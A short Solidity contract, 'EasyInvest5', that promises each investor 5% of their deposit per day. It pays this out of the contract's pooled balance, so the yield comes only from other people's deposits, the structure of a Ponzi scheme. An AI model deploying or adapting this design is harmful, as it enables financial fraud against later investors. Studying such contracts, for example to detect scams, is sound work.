pragma solidity >=0.4.22 <0.9.0;

contract EasyInvest5 {
    // records amounts invested
    mapping (address => uint256) public invested;
    // records blocks at which investments were made
    mapping (address => uint256) public atBlock;

    // this function called every time anyone sends a transaction to this contract
    fallback() external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 5% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            payable(msg.sender).transfer(amount);
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }

    function getValueInvested(address userAddress) public view returns(uint value) {
        return invested[userAddress];
    }
    function getValueAtBlock(address userAddress) public view returns(uint value) {
        return atBlock[userAddress];
    }
}
